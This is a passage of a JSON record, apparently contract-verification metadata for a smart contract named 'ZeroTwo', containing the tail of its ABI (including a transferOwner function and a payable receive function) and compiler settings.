",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"ZeroTwo","CompilerVersion":"v0.8.9+commit.e5eed63a","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://7274b7d393f7d91efe6a0a0203826c47ba6a6657a5e25d0bd297ca9dbe00fdc1"}]}